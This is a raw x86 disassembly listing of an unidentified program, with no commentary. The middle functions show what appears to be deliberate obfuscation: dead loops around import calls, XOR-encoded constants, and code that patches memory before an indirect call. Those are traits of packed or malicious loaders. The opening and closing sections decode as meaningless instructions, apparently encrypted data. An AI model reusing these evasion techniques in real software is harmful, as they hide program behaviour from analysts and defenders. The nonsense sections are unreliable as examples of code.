  40b14b:	pop    edi
  40b14c:	xchg   ebx,eax
  40b14d:	mov    edi,0x3e4b5c35
  40b152:	pop    esi
  40b153:	loopne 0x40b1b3
  40b155:	mov    edi,0x34076672
  40b15a:	xchg   ecx,eax
  40b15b:	sbb    BYTE PTR [eax+0x10acc68b],0x56
  40b162:	xlat   BYTE PTR ds:[ebx]
  40b163:	push   esi
  40b164:	(bad)  
  40b165:	or     al,0x37
  40b167:	pop    edx
  40b168:	push   esp
  40b169:	pop    ebx
  40b16a:	fdivr  DWORD PTR [esi]
  40b16c:	fnop   
  40b16e:	sbb    bh,ch
  40b170:	push   ss
  40b171:	xlat   BYTE PTR ds:[ebx]
  40b172:	addr16 out dx,al
  40b174:	ret    0x90ed
  40b177:	mov    gs,WORD PTR ds:0xb20881a3
  40b17d:	rcr    BYTE PTR [esi],0x45
  40b180:	in     eax,dx
  40b181:	mov    dl,0xc8
  40b183:	adc    ah,BYTE PTR [ebx-0x40449dda]
  40b189:	je     0x40b17f
  40b18b:	push   eax
  40b18c:	fwait
  40b18d:	sub    eax,0xc7204b3b
  40b192:	setnp  BYTE PTR [ecx-0x19]
  40b196:	mov    bh,0x8b
  40b198:	inc    ebp
  40b199:	sbb    BYTE PTR [ebx+0x46891075],cl
  40b19f:	or     al,0x8b
  40b1a1:	inc    ebp
  40b1a2:	sbb    al,0x8b
  40b1a4:	jne    0x40b1b6
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d3dc
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0x77db8ce1
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x33]
  40bac3:	pushf  
  40bac4:	xor    esi,DWORD PTR [esi+0x399ff7f6]
  40baca:	cmp    bh,bl
  40bacc:	pop    esp
  40bacd:	in     al,0x1f
  40bacf:	pop    edi
  40bad0:	pop    ebx
  40bad1:	aad    0x49
  40bad3:	cmp    BYTE PTR [ecx-0x45],0x2c
  40bad7:	aas    
  40bad8:	and    bl,0x22
  40badb:	push   esp
  40badc:	(bad)  [ebp-0x31c0fea4]
  40bae2:	test   al,0x1c
  40bae4:	retf   
  40bae5:	lds    ecx,FWORD PTR [esi]
  40bae7:	lods   eax,DWORD PTR ds:[esi]
  40bae8:	aaa    
  40bae9:	cdq    
  40baea:	scas   eax,DWORD PTR es:[edi]
  40baeb:	xchg   ebx,eax
  40baec:	test   eax,ebx
  40baee:	cmc    
  40baef:	retfw  0xb979
  40baf3:	lock loopne 0x40bb0d
  40baf6:	or     eax,0xa921b251
  40bafb:	outs   dx,DWORD PTR ds:[esi]
  40bafc:	out    dx,al
  40bafd:	dec    edx
  40bafe:	outs   dx,DWORD PTR ds:[esi]
  40baff:	int    0xf6
  40bb01:	add    al,BYTE PTR [ecx-0x31292f9e]
  40bb07:	ss out 0x90,eax
  40bb0a:	fdivr  DWORD PTR [edi-0x7f]
  40bb0d:	push   ds
  40bb0e:	xor    al,dl
  40bb10:	out    dx,eax
  40bb11:	mov    ebx,0x43e6eb4c
  40bb16:	test   DWORD PTR [edi+0x42],eax
  40bb19:	push   ebp
  40bb1a:	(bad)  
  40bb1b:	sbb    edi,DWORD PTR [edx+0x7d1bf785]
  40bb21:	lock ds sbb eax,0x3ee5c95d
  40bb28:	fistp  DWORD PTR ds:0xc55fc5fe
  40bb2e:	jmp    0x69a2b8d4
  40bb33:	or     BYTE PTR [edi],al
  40bb35:	xlat   BYTE PTR ds:[ebx]
  40bb36:	out    dx,al
  40bb37:	daa    
  40bb38:	rcl    edi,1
  40bb3a:	in     al,dx
  40bb3b:	cmp    al,0xba
  40bb3d:	ins    DWORD PTR es:[edi],dx
  40bb3e:	fisubr WORD PTR [esi]
  40bb40:	pop    ecx
  40bb41:	dec    esp
  40bb42:	fs cs ins BYTE PTR es:[edi],dx
  40bb45:	xor    dl,BYTE PTR [esi]
  40bb47:	push   es
  40bb48:	rol    DWORD PTR [eax+esi*4+0x10e72c47],1
  40bb4f:	ror    ah,cl
  40bb51:	dec    esp
  40bb52:	ror    DWORD PTR [eax+0x78],1
  40bb55:	hlt    
  40bb56:	call   0xfee9ec50
  40bb5b:	inc    esp
  40bb5c:	cmp    eax,0x9b1befbe
  40bb61:	das    
  40bb62:	xor    al,0xe5
  40bb64:	pop    es
  40bb65:	push   eax
  40bb66:	mov    ch,0x8
  40bb68:	js     0x40baee
  40bb6a:	inc    eax
  40bb6b:	pop    ebp
  40bb6c:	fadd   QWORD PTR [edx+0x6f]
  40bb6f:	push   esi
  40bb70:	iret   
  40bb71:	sti    
  40bb72:	add    BYTE PTR [esi+0x26],bl
  40bb75:	mov    ebx,0x6edf4b39
  40bb7a:	xchg   BYTE PTR [eax+0x74],al
  40bb7d:	in     al,dx
  40bb7e:	jmp    0x2719:0x3494e3e4
  40bb85:	jbe    0x40bba7
  40bb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb88:	and    al,0x52
  40bb8a:	jb     0x40bbb9
  40bb8c:	je     0x40bb1a
  40bb8e:	popf   
  40bb8f:	push   ebp
  40bb90:	and    eax,0x29d1f134
  40bb95:	std    
  40bb96:	cld    
  40bb97:	and    eax,0xe61d3977
  40bb9c:	pop    es
  40bb9d:	adc    DWORD PTR [edi],0xc7f4dc4
  40bba3:	cwde   
  40bba4:	xchg   DWORD PTR [esi-0x61bc5eba],edi
  40bbaa:	mov    ds:0x1a44f84c,eax
  40bbaf:	fdivr  st,st(6)
  40bbb1:	pushf  
  40bbb2:	rcr    BYTE PTR [ebx],cl
  40bbb4:	imul   esp,eax,0x62
  40bbb7:	inc    ecx
  40bbb8:	xchg   BYTE PTR [eax+0x26],cl
  40bbbb:	ret    0xaff6
